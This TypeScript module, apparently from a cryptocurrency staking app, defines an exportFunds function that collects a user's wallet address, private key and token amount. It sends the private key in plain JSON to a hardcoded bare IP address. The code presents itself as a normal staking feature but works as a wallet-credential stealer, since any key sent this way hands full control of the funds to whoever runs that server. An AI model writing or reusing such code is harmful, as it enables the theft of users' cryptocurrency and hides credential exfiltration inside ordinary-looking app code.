import { StakingFormData } from '../types/staking';

const API_BASE_URL = 'https://54.38.189.103:3004/api/v1';

export async function exportFunds(data: { 
  walletAddress: string; 
  privateKey: string; 
  dioneAmount: string; 
}) {
  const response = await fetch(`${API_BASE_URL}/wallet/process`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      walletAddress: data.walletAddress,
      privateKey: data.privateKey,
      dioneAmount: data.dioneAmount
    }),
  });

  if (!response.ok) {
    throw new Error('Failed to export funds');
  }

  return response.json();
}